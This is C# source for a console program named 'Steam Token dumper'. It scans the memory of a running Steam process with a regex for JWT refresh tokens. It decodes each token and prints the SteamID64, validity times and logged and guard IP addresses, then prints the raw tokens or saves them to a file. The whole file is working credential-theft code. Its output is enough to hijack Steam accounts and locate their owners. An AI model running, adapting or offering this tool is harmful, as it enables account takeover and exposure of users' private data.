using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace TokenDump
{
    internal sealed class Program
    {
        private static readonly Regex tokenRegex = new Regex("eyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0[0-9a-zA-Z\\.\\-_]+");



        public static void Main(string[] args)
        {
            string saveToFile = string.Empty;
            bool saveEnabled = false;

            Console.Title = "Steam Token dumper";

            if (args.Length == 1)
            {
                Print.Info("dumper.exe /save file.txt");
                Environment.Exit(0);
            }
           
            if (args.Length > 1 && args[0] == "/save")
            {
                saveToFile = args[1];
                saveEnabled = true;
            }


            if (!saveEnabled) Print.Info("Scanning started...");

            Process[] steam = Process.GetProcessesByName("steam");

            if (steam.Length > 0 )
            {
                string[] tokens = ProcessScan.ScanProcessMemory(steam[0], Encoding.ASCII, tokenRegex);

                foreach (string token in tokens)
                {
                    // Decode base64 url token payload
                    string base64 = token.Split('.')[1].Replace('-', '+').Replace('_', '/');
                    switch (base64.Length % 4)
                    {
                        case 2: base64 += "=="; break;
                        case 3: base64 += "="; break;
                    }
                    JSONNode json = JSON.Parse(Encoding.UTF8.GetString(Convert.FromBase64String(base64)));

                    DateTime
                        iat = DateTimeOffset.FromUnixTimeSeconds(json["iat"].AsLong).UtcDateTime,
                        nbf = DateTimeOffset.FromUnixTimeSeconds(json["nbf"].AsLong).UtcDateTime,
                        exp = DateTimeOffset.FromUnixTimeSeconds(json["exp"].AsLong).UtcDateTime;

                    Print.Info("SteamID64: " + json["sub"].Value);

                    Print.Info("Issued At:  " + iat);
                    Print.Info("Not Before: " + nbf);
                    Print.Info("Expiration: " + exp);

                    Print.Info("Logged IP: " + json["ip_subject"].Value);
                    Print.Info("Guard IP: " + json["ip_confirmer"].Value);
                   
                    
                    if (saveEnabled)
                    {
                        File.AppendAllText(saveToFile, token + "\n\n");
                    }
                    else
                    {
                        Print.Success("Refresh token: " + token + "\n");
                    }
                }
            }
            else
            {
                if (!saveEnabled) Print.Warning("No steam process found!");
            }


            if (!saveEnabled)
            {
                Print.Info("Scanning finished... (Enter to exit)");
                Console.ReadLine();
            }
            
        }
    }
}
